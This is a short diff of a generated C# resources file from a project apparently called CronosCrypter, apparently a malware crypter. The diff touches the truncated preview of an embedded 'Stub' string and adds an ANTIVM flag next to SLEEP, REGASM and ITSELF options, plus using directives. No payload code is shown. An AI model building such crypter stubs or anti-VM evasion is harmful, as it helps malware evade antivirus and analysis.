@@ -90,9 +90,11 @@ namespace CronosCrypter.Properties {
         /////#define ITSELF
         /////#define REGASM
         ///
+        /////#define ANTIVM
         /////#define SLEEP
         ///
         ///using System;
+        ///using System.Collections.Generic;
         ///using System.ComponentModel;
         ///using System.Diagnostics;
         ///using System.IO;
@@ -103,10 +105,7 @@ namespace CronosCrypter.Properties {
         ///using System.Security.Cryptography;
         ///using System.Security.Principal;
         ///using System.Text;
-        ///using System.Threading;
-        ///using System.Windows.Forms;
-        ///
-        ///n [obcięto pozostałą część ciągu]&quot;;.
+        ///usin [obcięto pozostałą część ciągu]&quot;;.
         /// </summary>
         internal static string Stub {
             get {
